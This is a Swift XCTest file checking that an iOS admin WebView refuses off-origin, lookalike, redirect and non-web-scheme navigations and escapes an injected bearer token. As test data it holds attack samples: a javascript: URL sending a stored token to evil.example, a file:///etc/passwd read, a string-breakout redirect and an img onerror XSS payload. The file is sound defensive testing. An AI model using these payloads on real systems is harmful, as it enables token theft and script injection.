import XCTest

@testable import SylKit

/// The two pure halves of the admin WebView: where it is allowed to point, and what
/// it is allowed to go to afterwards.
///
/// **These live here rather than in `SylTests` on purpose.** The navigation predicate
/// is the thing standing between a live bearer token and an arbitrary web page; it has
/// to be cheap enough to run on every edit, and a simulator boot is not cheap. Same
/// seam argument the backend makes for keeping its protocol codec pure.
final class AdminConsoleTests: XCTestCase {
    private let pairedHost = "reason-2.tail714e0e.ts.net"

    private func apiBase(_ string: String) throws -> URL {
        try XCTUnwrap(URL(string: string))
    }

    private func policy() throws -> AdminNavigationPolicy {
        let admin = try XCTUnwrap(
            AdminConsole.url(forAPIBaseURL: try apiBase("https://\(pairedHost)/api/v1"))
        )
        return try XCTUnwrap(AdminNavigationPolicy(adminURL: admin))
    }

    private func url(_ string: String) throws -> URL {
        try XCTUnwrap(URL(string: string))
    }

    // MARK: - Deriving the admin URL

    /// One host, one source. The app already knows where Syl is; storing a second URL
    /// for the admin is how the two drift and the Commander ends up fixing his address
    /// in two places after re-pairing.
    func testShouldDeriveTheAdminURLFromTheAPIBaseURL() throws {
        let admin = AdminConsole.url(forAPIBaseURL: try apiBase("https://\(pairedHost)/api/v1"))

        XCTAssertEqual(admin?.absoluteString, "https://\(pairedHost)/admin")
    }

    func testShouldKeepANonDefaultPortWhenDerivingTheAdminURL() throws {
        let admin = AdminConsole.url(forAPIBaseURL: try apiBase("https://\(pairedHost):8443/api/v1"))

        XCTAssertEqual(admin?.absoluteString, "https://\(pairedHost):8443/admin")
    }

    /// The admin is the *origin* plus `/admin`, so anything else the base URL is
    /// carrying — a deeper path, a query, a fragment — is discarded rather than
    /// prefixed. A base URL of `https://host/syl/api/v1` still means `https://host/admin`.
    func testShouldDiscardEverythingBeyondTheOriginWhenDerivingTheAdminURL() throws {
        let admin = AdminConsole.url(
            forAPIBaseURL: try apiBase("https://\(pairedHost)/syl/api/v1?debug=1#top")
        )

        XCTAssertEqual(admin?.absoluteString, "https://\(pairedHost)/admin")
    }

    /// A trailing slash on the base URL is a typing artefact, not a different server.
    func testShouldDeriveTheSameAdminURLWhateverTheBasePathLooksLike() throws {
        let withSlash = AdminConsole.url(forAPIBaseURL: try apiBase("https://\(pairedHost)/api/v1/"))
        let bare = AdminConsole.url(forAPIBaseURL: try apiBase("https://\(pairedHost)"))

        XCTAssertEqual(withSlash?.absoluteString, "https://\(pairedHost)/admin")
        XCTAssertEqual(bare?.absoluteString, "https://\(pairedHost)/admin")
    }

    /// **Refusing cleartext is a security rule, not a convenience one.** This WebView
    /// is handed a live bearer credential; putting one into an `http` origin publishes
    /// it to every hop on the path. It is also the reason the epic serves the admin
    /// from Syl's own TLS origin rather than the Vite dev server — no App Transport
    /// Security exception, because there is nothing to except.
    func testShouldRefuseToDeriveAnAdminURLOverCleartext() throws {
        XCTAssertNil(AdminConsole.url(forAPIBaseURL: try apiBase("http://127.0.0.1:4210/api/v1")))
        XCTAssertNil(AdminConsole.url(forAPIBaseURL: try apiBase("http://\(pairedHost)/api/v1")))
    }

    func testShouldRefuseToDeriveAnAdminURLFromSomethingWithNoHost() throws {
        XCTAssertNil(AdminConsole.url(forAPIBaseURL: try apiBase("file:///var/tmp/api/v1")))
        XCTAssertNil(AdminConsole.url(forAPIBaseURL: try apiBase("https:///api/v1")))
    }

    /// Hostnames are case-insensitive, and the derived URL is normalised so the
    /// navigation policy built from it compares against one spelling.
    func testShouldNormaliseHostCaseWhenDerivingTheAdminURL() throws {
        let admin = AdminConsole.url(forAPIBaseURL: try apiBase("https://REASON-2.Tail714E0E.TS.NET/api/v1"))

        XCTAssertEqual(admin?.absoluteString, "https://\(pairedHost)/admin")
    }

    // MARK: - What the WebView is allowed to reach

    func testShouldAllowTheAdminItself() throws {
        XCTAssertEqual(try policy().decide(url: try url("https://\(pairedHost)/admin")), .allow)
    }

    func testShouldAllowAnyPathQueryOrFragmentOnThePairedOrigin() throws {
        let policy = try policy()

        XCTAssertEqual(policy.decide(url: try url("https://\(pairedHost)/admin/reminders")), .allow)
        XCTAssertEqual(policy.decide(url: try url("https://\(pairedHost)/assets/index-a1b2.js")), .allow)
        XCTAssertEqual(policy.decide(url: try url("https://\(pairedHost)/admin?tab=jobs#next")), .allow)
        XCTAssertEqual(policy.decide(url: try url("https://\(pairedHost)/")), .allow)
    }

    func testShouldTreatThePairedHostCaseInsensitively() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://REASON-2.TAIL714E0E.TS.NET/admin")),
            .allow
        )
    }

    // MARK: - Attempts to defeat the restriction

    /// The plain case: a link to somewhere else entirely.
    func testShouldRefuseAnOffOriginNavigation() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://evil.example/steal")),
            .refuse(.differentOrigin)
        )
    }

    /// **The one a prefix match would let through.** `hasPrefix` on the host string
    /// says yes to `reason-2.tail714e0e.ts.net.evil.com`, which is a host somebody else
    /// controls entirely. Origin comparison is whole-host equality, so it says no.
    func testShouldRefuseALookalikeHostThatMerelyStartsWithThePairedOne() throws {
        let policy = try policy()

        XCTAssertEqual(
            policy.decide(url: try url("https://\(pairedHost).evil.com/steal")),
            .refuse(.differentOrigin)
        )
        XCTAssertEqual(
            policy.decide(url: try url("https://\(pairedHost)-evil.com/steal")),
            .refuse(.differentOrigin)
        )
    }

    /// The mirror image: a suffix match would let a subdomain through, and a subdomain
    /// of a tailnet host is not the paired machine.
    func testShouldRefuseASubdomainOfThePairedHost() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://admin.\(pairedHost)/steal")),
            .refuse(.differentOrigin)
        )
    }

    /// A truncation, in case anything ever compares by containment.
    func testShouldRefuseATruncatedVersionOfThePairedHost() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://reason-2.tail714e0e.ts.ne/steal")),
            .refuse(.differentOrigin)
        )
    }

    /// **The userinfo trick.** `https://reason-2.tail714e0e.ts.net@evil.com/` reads as
    /// the paired host to a person and resolves to `evil.com`. Anything comparing the
    /// URL *string* rather than the parsed host falls for it.
    func testShouldRefuseAURLWhoseUserinfoImpersonatesThePairedHost() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://\(pairedHost)@evil.com/steal")),
            .refuse(.differentOrigin)
        )
        XCTAssertEqual(
            try policy().decide(url: try url("https://\(pairedHost):token@evil.com/steal")),
            .refuse(.differentOrigin)
        )
    }

    /// Origin is a triple, not a hostname. Same host over cleartext is a different
    /// origin and would also put the injected token on the wire in clear.
    func testShouldRefuseThePairedHostOverCleartext() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("http://\(pairedHost)/admin")),
            .refuse(.differentOrigin)
        )
    }

    func testShouldRefuseThePairedHostOnADifferentPort() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://\(pairedHost):8443/admin")),
            .refuse(.differentOrigin)
        )
    }

    /// The default port spelled out is the same origin, and must not be refused —
    /// otherwise a redirect that normalises the URL breaks the screen.
    func testShouldAllowThePairedHostWithItsDefaultPortWrittenOut() throws {
        XCTAssertEqual(try policy().decide(url: try url("https://\(pairedHost):443/admin")), .allow)
    }

    /// Schemes that are not an origin at all. `javascript:` in particular is the one
    /// that reads the injected token straight out of `localStorage`.
    func testShouldRefuseSchemesThatAreNotAWebOrigin() throws {
        let policy = try policy()

        for candidate in [
            "javascript:fetch('https://evil.example/?t='+localStorage.getItem('syl.admin.api-key'))",
            "data:text/html,<script>location='https://evil.example'</script>",
            "file:///etc/passwd",
            "about:blank",
            "syl://admin",
            "itms-apps://apps.apple.com/app/id1",
        ] {
            XCTAssertEqual(
                policy.decide(url: try url(candidate)),
                .refuse(.unsupportedScheme),
                "\(candidate) should not be reachable from the admin WebView"
            )
        }
    }

    func testShouldRefuseANavigationWithNoURLAtAll() throws {
        XCTAssertEqual(try policy().decide(url: nil), .refuse(.noURL))
    }

    /// `target="_blank"` and `window.open`. WebKit reports these as a navigation with
    /// no target frame; a WebView holding a credential does not spawn windows.
    func testShouldRefuseANewWindowEvenOntoThePairedOrigin() throws {
        XCTAssertEqual(
            try policy().decide(url: try url("https://\(pairedHost)/admin"), opensNewWindow: true),
            .refuse(.newWindow)
        )
    }

    /// **A redirect is the interesting attack, because the first hop looks fine.**
    /// WebKit re-asks the delegate for every hop of a server redirect, so the policy
    /// sees the off-origin destination and refuses it there — the same-origin hop
    /// before it is allowed, which is what makes this different from the flat
    /// off-origin case above.
    func testShouldRefuseTheHopOfARedirectChainThatLeavesThePairedOrigin() throws {
        let policy = try policy()
        let chain = [
            try url("https://\(pairedHost)/admin"),
            try url("https://\(pairedHost)/admin/go?to=out"),
            try url("https://\(pairedHost).evil.com/collect"),
            try url("https://evil.example/collect"),
        ]

        XCTAssertEqual(
            chain.map { policy.decide(url: $0) },
            [.allow, .allow, .refuse(.differentOrigin), .refuse(.differentOrigin)]
        )
    }

    /// A policy cannot be built from something that is not an origin, so there is no
    /// way to end up with a WebView whose allowed set is "anything".
    func testShouldRefuseToBuildAPolicyFromANonOriginURL() throws {
        XCTAssertNil(AdminNavigationPolicy(adminURL: try url("file:///admin")))
        XCTAssertNil(AdminNavigationPolicy(adminURL: try url("about:blank")))
    }

    // MARK: - The credential handoff

    /// Pinned, because the other half of this contract is a TypeScript constant in a
    /// different workspace (`frontend/src/auth/api-key-store.ts`). If either side
    /// renames the key the handoff silently stops working and the admin shows its
    /// login gate — this test is the thing that says which side moved.
    func testShouldUseTheStorageKeyTheAdminActuallyReads() {
        XCTAssertEqual(AdminConsole.credentialStorageKey, "syl.admin.api-key")
    }

    func testShouldWriteTheCredentialIntoTheStorageKeyTheAdminReads() throws {
        let script = try XCTUnwrap(AdminConsole.credentialScript(token: "syl-live-token"))

        XCTAssertTrue(script.contains("localStorage"))
        XCTAssertTrue(script.contains("setItem"))
        XCTAssertTrue(script.contains(#""syl.admin.api-key""#))
        XCTAssertTrue(script.contains(#""syl-live-token""#))
    }

    /// **The injected script is source code with a secret pasted into it.** A token
    /// containing a quote, a backslash or a newline would otherwise end the string
    /// literal and turn the rest of the credential into executable JavaScript running
    /// on the admin's own origin.
    func testShouldEscapeATokenThatWouldOtherwiseBreakOutOfTheStringLiteral() throws {
        let script = try XCTUnwrap(
            AdminConsole.credentialScript(
                token: "a\"b\\c\nd';window.location='https://evil.example'//"
            )
        )

        // Nothing that could close the literal, or start a statement after it,
        // survives verbatim.
        XCTAssertFalse(script.contains("a\"b"))
        XCTAssertFalse(script.contains("\\c"))
        XCTAssertFalse(script.contains("evil.example'"))
        XCTAssertFalse(script.contains("d';"))
        XCTAssertFalse(script.contains("\n"), "a literal newline would end the statement")
        XCTAssertTrue(script.contains("\\u0022"))
        XCTAssertTrue(script.contains("\\u005C"))
        XCTAssertTrue(script.contains("\\u000A"))
    }

    /// The script is also injected into an HTML document, so a token carrying a
    /// closing tag must not be able to end the script element early.
    func testShouldEscapeATokenCarryingAClosingScriptTag() throws {
        let script = try XCTUnwrap(
            AdminConsole.credentialScript(token: "abc</script><img src=x onerror=alert(1)>")
        )

        XCTAssertFalse(script.localizedCaseInsensitiveContains("</script"))
        XCTAssertFalse(script.contains("<img"))
    }

    /// Edge: an empty token is not a credential. Writing `""` would leave the admin
    /// building `Bearer ` and reporting a confusing 401 rather than showing its gate,
    /// which is the one failure mode this whole screen exists to avoid.
    func testShouldRefuseToBuildAScriptForABlankToken() {
        XCTAssertNil(AdminConsole.credentialScript(token: "   "))
        XCTAssertNil(AdminConsole.credentialScript(token: ""))
    }
}
